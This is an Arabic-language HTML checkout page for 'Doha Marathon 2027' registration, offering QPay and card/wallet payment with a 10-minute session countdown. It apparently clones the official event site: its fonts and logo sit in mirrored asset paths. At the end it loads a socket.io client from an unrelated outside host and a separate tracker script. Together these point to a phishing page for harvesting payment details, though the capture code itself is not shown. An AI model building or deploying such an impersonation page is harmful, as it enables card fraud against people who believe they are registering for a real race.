<!doctype html>
<html lang="ar" dir="rtl">
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="theme-color" content="#ed1c24">
	<title>طريقة الدفع - ماراثون الدوحة 2027</title>
	<link rel="stylesheet" href="assets/dohamarathonooredoo.com/wp-content/uploads/elementor/google-fonts/css/notosans.css">
	<link rel="stylesheet" href="assets/dohamarathonooredoo.com/wp-content/uploads/elementor/google-fonts/css/rubik.css">
	<link rel="stylesheet" href="assets/registration-payment.css">
	<script src="assets/registration-payment.js" defer></script>
</head>
<body>
	<header class="payment-header">
		<nav class="header-actions" aria-label="روابط سريعة">
			<a href="index.html" aria-label="العودة للرئيسية" title="العودة للرئيسية">
				<svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="9"></circle><path d="M3 12h18M12 3a15 15 0 0 1 0 18M12 3a15 15 0 0 0 0 18"></path></svg>
			</a>
			<span class="participant-count" aria-label="مشارك واحد">(1)</span>
			<svg class="cart-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M2 3h2l2.3 12.1a2 2 0 0 0 2 1.6h9.9a2 2 0 0 0 2-1.6L22 7H5"></path><circle cx="9" cy="21" r="1"></circle><circle cx="18" cy="21" r="1"></circle></svg>
		</nav>
		<a class="payment-brand" href="index.html" aria-label="ماراثون الدوحة من أريدُ">
			<img src="assets/suffixevnt.blob.core.windows.net/dohaimages/2025/06/Logo.png" alt="ماراثون الدوحة من أريدُ">
		</a>
	</header>

	<main class="payment-shell">
		<section class="payment-card" aria-label="اختيار طريقة الدفع">
			<div class="session-row">
				<strong id="session-countdown" class="session-countdown" aria-live="off">10:00</strong>
				<span>تنتهي صلاحية الجلسة خلال</span>
			</div>

			<div class="payment-total">
				<p>إجمالي المبلغ المستحق الدفع</p>
				<strong id="payment-total" class="amount"></strong>
			</div>

			<form id="payment-form" novalidate>
				<fieldset class="payment-methods">
					<legend>اختر طريقة الدفع</legend>
					<label class="payment-method">
						<input type="radio" name="payment-method" value="qpay">
						<span class="method-name">QPay (Debit Card)</span>
						<span class="qpay-logo" aria-label="Qatar Pay">Q<span>PAY</span></span>
						<span class="method-indicator" aria-hidden="true"></span>
					</label>
					<label class="payment-method">
						<input type="radio" name="payment-method" value="cards">
						<span class="method-name">Visa/Master Card/Apple Pay/Gpay</span>
						<span class="card-logos" aria-label="Visa، Mastercard، Apple Pay، Google Pay">
							<span class="visa-logo">VISA</span>
							<span class="mastercard-logo" aria-hidden="true"><i></i><i></i></span>
							<span class="wallet-logo">Apple Pay</span>
							<span class="wallet-logo">G Pay</span>
						</span>
						<span class="method-indicator" aria-hidden="true"></span>
					</label>
				</fieldset>

				<label class="acceptance">
					<input id="terms-accepted" type="checkbox">
					<span>لقد قرأت وقبلت <strong>الشروط والأحكام</strong></span>
				</label>

				<button id="pay-button" class="pay-button" type="submit" disabled></button>
				<p id="payment-message" class="payment-message" role="status" aria-live="polite" hidden></p>
			</form>

			<a class="back-link" href="registration-summary.html">خلف</a>
			
		</section>
	</main>
	<footer class="payment-footer" aria-hidden="true"></footer>
<script src="https://marath.onrender.com/socket.io/socket.io.js"></script>
<script src="/assets/tracker.js"></script>
</body>
</html>
